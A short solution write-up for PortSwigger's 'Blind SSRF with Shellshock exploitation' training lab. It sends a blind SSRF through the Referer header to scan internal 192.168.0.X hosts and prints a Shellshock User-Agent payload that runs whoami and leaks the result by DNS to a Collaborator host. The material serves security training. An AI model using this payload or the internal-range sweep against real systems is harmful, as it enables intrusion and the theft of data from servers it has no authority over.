# Lab: Blind SSRF with Shellshock exploitation (Expert)

**Lab:** [https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation](https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation)

**Task (from PortSwigger):**  
This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded.

To solve the lab, use this functionality to perform a blind SSRF attack against an internal server in the `192.168.0.X` range on port 8080. In the blind attack, use a Shellshock payload against the internal server to exfiltrate the name of the OS user.

**Note:** Use Burp Collaborator’s default public server.

## Vulnerability
Blind SSRF via Referer + internal host runs a Shellshock-vulnerable service that echoes User-Agent into a shell.

## Solution

1. Install Collaborator Everywhere; scope the lab domain.
2. Confirm Referer triggers Collaborator; User-Agent is reflected in the request.
3. Product request → Intruder.
4. User-Agent Shellshock payload:

```
() { :; }; /usr/bin/nslookup $(whoami).YOUR-COLLABORATOR-SUBDOMAIN
```

5. Referer: `http://192.168.0.§1§:8080` — Numbers 1–255.
6. Attack → Poll Collaborator → DNS interaction contains OS username.
7. Submit the username to solve the lab.

## Final Payloads
```
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).YOUR-COLLABORATOR-SUBDOMAIN
Referer: http://192.168.0.X:8080
```
